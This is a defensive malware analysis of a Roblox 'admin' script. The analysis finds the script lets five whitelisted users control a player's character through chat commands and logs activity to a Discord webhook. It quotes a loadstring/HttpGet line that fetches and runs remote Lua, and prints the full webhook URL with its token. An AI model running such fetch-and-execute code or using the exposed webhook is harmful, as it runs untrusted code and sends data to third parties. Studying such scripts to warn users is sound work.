# AK Script - Complete Command Analysis

## 🚨 CRITICAL SECURITY FINDINGS

### This is NOT Just a Reanimation Script!

This script is a **REMOTE CONTROL SYSTEM** that allows whitelisted users to control your character!

---

## 🔴 Major Security Issues

### 1. Remote Control by Others
**WHITELISTED USER IDs** (line 3-9):
```lua
34963408
7706532914
8319842463
1810203567
2823434956
```

**What This Means:**
- These users can send chat commands to control YOUR character
- They can make you: fling, kill yourself, freeze, jump, sit, say things, etc.
- You have NO CONTROL over what they do to your character
- Their commands execute on YOUR client

### 2. Discord Webhook Logging
**Webhook URL** (line 42):
```
https://discord.com/api/webhooks/1416824385267957800/1qCdZ7WoxBAOWtYMgpzFnAiwj0w5hOkMeRsEUE_VDjLUwBgQOllGOzZ2db63Ai10Z1lg
```

**What Gets Logged:**
- Every command you execute
- Every command others execute on you
- Your username and display name
- Timestamp of all activity
- Success/failure of commands

**Privacy Impact:**
- Script author can see ALL your activity
- They know when you use the script
- They know what you're doing in-game
- Complete surveillance of script usage

### 3. Additional Script Loading
**For Whitelisted Users** (line 905-910):
```lua
if isWhitelisted(player.Name) then
    loadstring(game:HttpGet("https://ichfickdeinemutta.pages.dev/Ownercmdbar.lua"))()
end
```

If your Roblox username matches a whitelisted user, it downloads and executes ANOTHER script from an external server.

---

## 📋 Complete Command List

### Found: 40 Commands (with 75+ total aliases)

The "75 commands" likely refers to counting all command aliases. Here are the actual commands:

#### Control Commands (Used by Whitelisted Users on You)

| Command | Aliases | Description | Security Impact |
|---------|---------|-------------|-----------------|
| `.kick <target>` | `.ban` | Kicks you from the game | ⚠️ Forces you to leave |
| `.chat <target> <msg>` | `.ch` | Makes you send a chat message | ⚠️ You say things you didn't type |
| `.crash <target>` | - | Crashes your game | ⚠️ Forces game crash |
| `.bring <target>` | `.br` | Teleports you to them | ⚠️ They control your position |
| `.kill <target>` | - | Kills your character | ⚠️ Instant death |
| `.reset <target>` | `.re` | Resets your character | ⚠️ Character reset |
| `.freeze <target>` | `.lock` | Freezes you in place | ⚠️ Can't move |
| `.thaw <target>` | `.unfreeze`, `.unlock` | Unfreezes you | - |
| `.jump <target>` | `.jmp`, `.unsit` | Makes you jump/unsit | - |
| `.sit <target>` | - | Makes you sit | - |
| `.fling <target>` | - | Flings you away | ⚠️ Throws you across map |
| `.fling2 <target>` | - | Alternative fling method | ⚠️ Throws you across map |
| `.trip <target>` | - | Makes you trip/fall | - |
| `.creepy <target>` | `.shiver`, `.xd` | Makes you shiver creepily | - |
| `.knock <target>` | `.xd2` | Knocks you down | - |
| `.jumpscare <target>` | `.jp`, `.js`, `.lol` | Jumpscares you (animation) | - |
| `.jumpscare2 <target>` | `.jp2`, `.js2`, `.lol2` | Alternative jumpscare | - |
| `.jumpscarefast <target>` | `.jpf`, `.lol3` | Fast jumpscare | - |
| `.stun <target>` | - | Stuns your character | ⚠️ Can't move |
| `.unstun <target>` | - | Removes stun | - |
| `.loopkill <target>` | - | Kills you every respawn | ⚠️ Permanent death loop |
| `.unloopkill <target>` | - | Stops loop killing | - |
| `.invert <target>` | - | Inverts your character | - |

#### Movement Commands (Your Commands or Theirs)

| Command | Aliases | Description |
|---------|---------|-------------|
| `.come <target> <dest>` | - | Teleports target to destination player |
| `.follow <target>` | - | Makes you follow a player |
| `.unfollow` | - | Stops following |
| `.speed <speed> <target>` | - | Changes walkspeed |
| `.walkto <target> <dest>` | - | Makes target walk to destination |
| `.orbit <target> <around>` | - | Orbits target around another player |
| `.dance <target>` | - | Makes target dance |
| `.circle <target>` | - | Makes target move in circles |
| `.goto <x> <y> <z> <target>` | - | Teleports to coordinates |
| `.spin <target>` | - | Spins the target |

#### Communication Commands

| Command | Aliases | Description |
|---------|---------|-------------|
| `.say <target> <message>` | - | Makes target say something in chat |

#### Meta Commands

| Command | Aliases | Description |
|---------|---------|-------------|
| `.usecmd <target> <cmd>` | - | Makes target execute a command |
| `.cmds <target>` | - | Shows available commands |
| `.whitelist <name>` | `.wl` | Adds user to whitelist (runtime only) |
| `.unwhitelist <name>` | `.unwl` | Removes from whitelist |
| `.listwhitelist` | `.lwl` | Shows whitelisted users |

---

## 🔍 How It Works

### Command Execution Flow

1. **Whitelisted user sends chat message** in game
   ```
   Example: ".kill artifaqt"
   ```

2. **Script detects message** (line 868-876)
   - Checks if sender is whitelisted
   - Parses command and target

3. **Validates target** (line 178)
   - If target matches YOUR username/display name
   - Command executes on YOUR character

4. **Logs to Discord** (line 48-85)
   - Sends webhook with:
     - Who executed command
     - What command
     - Success/failure
     - Timestamp

5. **Executes command function**
   - Manipulates YOUR character
   - You have NO control

### Example Attack Scenario

**Whitelisted user types in chat:**
```
.loopkill artifaqt
```

**What happens:**
1. Your character dies immediately
2. Every time you respawn, you die again
3. You're stuck in infinite death loop
4. Discord webhook logs: "loopkill executed on artifaqt"
5. Script author sees notification

**To stop it:**
- Another whitelisted user must type: `.unloopkill artifaqt`
- OR you close the game

---

## 🎯 Server Replication Method

### How Animations Are "Visible to All"

Looking at the commands, this script does NOT actually make animations visible to all players. Instead:

### What Actually Happens:

1. **Whitelisted users control your character** via chat commands
2. **Your character movements are visible** because YOU are actually moving
3. The script manipulates YOUR client's physics/position
4. Server sees your character moving normally and replicates to others

### The Deception:

- You thought YOU controlled the animations
- Actually, THEY control your character
- Other players see your character because it's really you moving
- It's not "reanimation visible to all" - it's "remote control of your character"

---

## 🚨 Security Assessment

### Threat Level: **HIGH**

| Category | Risk Level | Details |
|----------|-----------|---------|
| **Remote Control** | 🔴 CRITICAL | Others can fully control your character |
| **Privacy** | 🔴 CRITICAL | All activity logged to Discord |
| **Malicious Abuse** | 🔴 HIGH | Can be used to grief you |
| **Account Safety** | 🟡 MEDIUM | Could get you banned if they make you exploit |
| **Data Theft** | 🟢 LOW | No stealing of personal data detected |

### Specific Risks:

#### 1. Griefing
Whitelisted users can:
- Kill you repeatedly (`.loopkill`)
- Crash your game (`.crash`)
- Kick you from servers (`.kick`)
- Make you say inappropriate things (`.chat`, `.say`)
- Freeze/stun you (`.freeze`, `.stun`)

#### 2. Getting You Banned
They can:
- Make you exploit in ways that trigger anti-cheat
- Make you say bannable things in chat
- Make you harass other players
- Get you flagged by Roblox moderation

#### 3. Complete Surveillance
- Every command usage logged
- Script author knows when you're online
- Knows what games you use it in
- Can track your activity patterns

#### 4. Additional Malware
If you're whitelisted (unlikely), it downloads and runs:
```
https://ichfickdeinemutta.pages.dev/Ownercmdbar.lua
```
We don't know what this script does (could be anything).

---

## ⚠️ Comparison to Original Assessment

### What We Thought (Based on Loader Analysis):

✅ Client-side reanimation script
✅ Physics-based character control
✅ Safe - no malicious patterns
✅ Only affects your character

### What It Actually Is:

❌ Remote control system for whitelisted users
❌ Surveillance tool with Discord logging
❌ Griefing tool that can ruin your experience
❌ Others control your character, not you

---

## 📊 Other Captured Scripts

We captured 24 total payload files. Here's what each appears to be:

| File | Size | Likely Purpose |
|------|------|----------------|
| actual_payload_1.lua | 67K | ak.lua loader (VM obfuscated) |
| actual_payload_2.lua | 109K | Unknown large script |
| actual_payload_3.lua | 63K | Unknown |
| actual_payload_4.lua | 75K | Unknown |
| actual_payload_5.lua | 63K | Unknown |
| actual_payload_7.lua | 76K | Unknown |
| actual_payload_8.lua | 100K | Unknown |
| actual_payload_11.lua | 109K | Very large script (needs analysis) |
| **actual_payload_12.lua** | **31K** | **MAIN COMMAND SCRIPT (this analysis)** |
| actual_payload_13.lua | 93K | Unknown |
| actual_payload_14.lua | 91K | Unknown |
| actual_payload_15.lua | 1.4K | Position save/rejoin utility |
| actual_payload_16.lua | 78K | Unknown |
| actual_payload_17.lua | 4.6K | Small utility |
| actual_payload_18.lua | 4.6K | Small utility |
| actual_payload_19.lua | 4.6K | Small utility |
| actual_payload_20.lua | 166K | User tags/ranks configuration |
| actual_payload_21.lua | 9.0K | Unknown |
| actual_payload_23.lua | 13K | Unknown |
| actual_payload_24.lua | 682 bytes | Tiny script |

Some of these might be UI components, utilities, or additional features.

---

## 🛡️ Recommendations

### DO NOT USE THIS SCRIPT

**Reasons:**
1. You give complete control of your character to strangers
2. Everything you do is logged and monitored
3. Can be used to grief you at any time
4. Could get your account banned
5. No way to stop them without closing the game

### If You Already Used It:

1. **Close Roblox immediately**
2. **Clear your executor's workspace**
3. **Don't use the script again**
4. **Your activity was logged** - script author knows you used it
5. **Change nothing** - the script has no persistent access once closed

### The Script Is Designed To:

1. **Trick users** into thinking they get powerful commands
2. **Actually give control** to the script author and friends
3. **Monitor usage** via Discord webhooks
4. **Grief users** whenever they want

---

## 📝 Technical Details

### Command Prefix
```lua
local COMMAND_PREFIX = "."
```
All commands start with a dot (`.`)

### Whitelisted User IDs
```lua
local WHITELISTED_IDS = {
    34963408,
    7706532914,
    8319842463,
    1810203567,
    2823434956
}
```
Only these 5 users can send commands to control others.

### Webhook URL
```lua
local w = "https://discord.com/api/webhooks/1416824385267957800/..."
```
All command executions logged here.

### Auto-Load for Whitelisted
```lua
loadstring(game:HttpGet("https://ichfickdeinemutta.pages.dev/Ownercmdbar.lua"))()
```
Additional script for whitelisted users.

### Message Monitoring
```lua
textChatService.TextChannels.RBXGeneral.MessageReceived:Connect(function(message)
    if table.find(WHITELISTED_IDS, textSource.UserId) then
        handleMessage(players:GetPlayerByUserId(textSource.UserId), message.Text)
    end
end)
```
Constantly monitors chat for whitelisted users' commands.

---

## 🎓 What We Learned

### The "75 Commands"

Counting all **command names + aliases**:
- 40 base commands
- Each has 1-3 aliases
- Total unique names: ~75

Examples:
- `freeze` = also `lock` (2 names)
- `jumpscare` = also `jp`, `js`, `lol` (4 names)
- `thaw` = also `unfreeze`, `unlock` (3 names)

When you count all possible command names, you get ~75 total.

### Server-Side Visibility Explained

**Not what we thought:**
- Special animation replication technique
- Network ownership tricks
- Advanced physics manipulation

**What it actually is:**
- They send commands in chat
- Your script executes on your client
- Your character actually moves
- Server sees normal movement and replicates

**It's just remote control!**

---

## 🔐 Final Verdict

| Aspect | Rating |
|--------|--------|
| **Safety** | 🔴 UNSAFE |
| **Privacy** | 🔴 NO PRIVACY |
| **Trustworthiness** | 🔴 MALICIOUS |
| **Usefulness** | 🟡 Works but dangerous |
| **Recommendation** | ❌ DO NOT USE |

### Summary

This script is **intentionally deceptive**:
- Advertised as "75 command admin script"
- Actually gives admin to OTHER PEOPLE over YOUR character
- Logs everything to Discord
- Can be used to grief you
- Could get you banned

**You are not the admin - you are the target.**

---

## 📁 Files Generated

### Main Analysis
- [main_command_script.lua](c:/Users/Artifaqt/Downloads/ak/main_command_script.lua) - The 40-command script
- **COMMAND_ANALYSIS.md** - This document

### All Captured Payloads
Location: `c:\Users\Artifaqt\AppData\Local\Potassium\workspace\`
- actual_payload_1.lua through actual_payload_24.lua

---

**Analysis Complete - Stay Safe!** 🛡️
